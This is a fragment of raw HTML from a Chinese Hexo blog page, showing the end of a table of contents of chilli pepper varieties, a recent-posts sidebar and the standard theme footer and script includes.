href="#Jalapeno-Chillies"><span class="toc-number">1.1.54.</span> <span class="toc-text">Jalapeno Chillies</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pasilla-Chili"><span class="toc-number">1.1.55.</span> <span class="toc-text">Pasilla Chili</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Finger-Chilli"><span class="toc-number">1.1.56.</span> <span class="toc-text">Finger Chilli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Orange-Cayenne"><span class="toc-number">1.1.57.</span> <span class="toc-text">Orange Cayenne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Red-Cayenne"><span class="toc-number">1.1.58.</span> <span class="toc-text">Red Cayenne</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Birds-Eye-Chilli"><span class="toc-number">1.1.59.</span> <span class="toc-text">Birds Eye Chilli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Scotch-Bonnet"><span class="toc-number">1.1.60.</span> <span class="toc-text">Scotch Bonnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lemon-Habanero"><span class="toc-number">1.1.61.</span> <span class="toc-text">Lemon Habanero</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Red-Habanero"><span class="toc-number">1.1.62.</span> <span class="toc-text">Red Habanero</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ghost-Pepper"><span class="toc-number">1.1.63.</span> <span class="toc-text">Ghost Pepper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Chocolate-Scorpion-Chilli"><span class="toc-number">1.1.64.</span> <span class="toc-text">Chocolate Scorpion Chilli</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Carolina-Reaper"><span class="toc-number">1.1.65.</span> <span class="toc-text">Carolina Reaper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Intimidator-Chilli"><span class="toc-number">1.1.66.</span> <span class="toc-text">The Intimidator Chilli</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E6%96%87%E5%9C%B0%E5%9D%80%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">原文地址：</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/22/%E5%B0%8F%E5%AF%84%E5%B7%A7/117%E7%A7%8D%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/" title="提权手法收集">提权手法收集</a><time datetime="2024-01-22T04:19:38.677Z" title="发表于 2024-01-22 12:19:38">2024-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/22/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E5%9B%9B%E8%AE%B2%20%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/" title="第四讲 公钥密码体制">第四讲 公钥密码体制</a><time datetime="2024-01-22T04:17:59.445Z" title="发表于 2024-01-22 12:17:59">2024-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/01/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/c%E8%AF%AD%E8%A8%80%E7%BC%96%E8%AF%91%E7%B3%BB%E7%BB%9F%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/" title="c语言编译系统内部的工作原理">c语言编译系统内部的工作原理</a><time datetime="2024-01-22T04:17:14.265Z" title="发表于 2024-01-22 12:17:14">2024-01-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/26/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%B8%89%E8%AE%B2%20%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/" title="第三讲 分组密码">第三讲 分组密码</a><time datetime="2023-12-25T16:20:22.488Z" title="发表于 2023-12-26 00:20:22">2023-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/26/%E5%AF%86%E7%A0%81%E5%AD%A6/%E7%AC%AC%E4%BA%8C%E8%AE%B2%20%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/" title="第二讲 古典密码">第二讲 古典密码</a><time datetime="2023-12-25T16:20:22.484Z" title="发表于 2023-12-26 00:20:22">2023-12-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Enderman_1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
